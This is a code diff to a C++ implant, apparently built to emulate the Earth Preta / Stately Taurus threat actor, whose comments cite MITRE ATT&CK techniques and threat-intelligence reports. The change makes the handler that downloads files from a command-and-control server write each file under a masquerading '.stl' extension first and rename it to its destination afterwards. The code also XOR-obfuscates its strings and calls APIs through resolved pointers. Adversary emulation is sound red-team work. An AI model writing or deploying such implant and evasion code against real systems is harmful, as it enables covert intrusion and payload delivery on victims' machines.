@@ -241,12 +241,15 @@ DWORD PerformExecTask(sh_context* ctx, client_message* msg_buf, server_response*
 /*
  * PerformFileDownloadTask:
  *      About:
- *          Downloads file from C2 server and writes it to disk.
+ *          Downloads file from C2 server and writes it to disk. The download is
+ *          staged under a masquerading benign extension (<dest>.stl) and renamed
+ *          in-process to the final destination path once the write completes.
  *      Result:
  *          Returns 0 on success, otherwise some error code
  *      MITRE ATT&CK Techniques:
  *          T1105: Ingress Tool Transfer
  *          T1106: Native API
+ *          T1036.008: Masquerading: Masquerade File Type
  *      CTI:
  *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
  *          https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/
@@ -268,7 +271,15 @@ DWORD PerformFileDownloadTask(sh_context* ctx, client_message* msg_buf, server_r
     pi_widen_str(task_data->dest_path, task_data->dest_path_len, ctx->command_buf, MAX_PATH);
     DWORD task_num = task_data->task_num;
 
-    // Open handle to destination file
+    // Save the final destination path for the rename step
+    wchar_t final_path[MAX_PATH];
+    pi_memcpy(final_path, ctx->command_buf, MAX_PATH * sizeof(wchar_t));
+
+    // Masquerade staging: write download to <dest>.stl first, then rename in-process
+    pi_concat_wstrn(ctx->command_buf, MAX_CMD_LEN + 1, L".stl"_xor);
+    AesLogger::LogDebug(&(ctx->log_ctx), "Staging file to: %S"_xor, ctx->command_buf);
+
+    // Open handle to staging file
     HANDLE h_dest = ctx->fp.shared_fp.fp_CreateFileW(
         ctx->command_buf,
         GENERIC_READ | GENERIC_WRITE,
@@ -330,6 +341,14 @@ DWORD PerformFileDownloadTask(sh_context* ctx, client_message* msg_buf, server_r
 
     if (h_dest != NULL && h_dest != INVALID_HANDLE_VALUE) {
         ctx->fp.shared_fp.fp_CloseHandle(h_dest);
+    }
+
+    // Rename staging file to the final destination path
+    if (result == ERROR_SUCCESS) {
+        if (!ctx->fp.shared_fp.fp_MoveFileExW(ctx->command_buf, final_path, MOVEFILE_REPLACE_EXISTING)) {
+            result = ctx->fp.shared_fp.fp_GetLastError();
+            AesLogger::LogError(&(ctx->log_ctx), "Failed to rename staging file to destination. Error code: %d"_xor, result);
+        }
     }
 
     // Send success or error notification
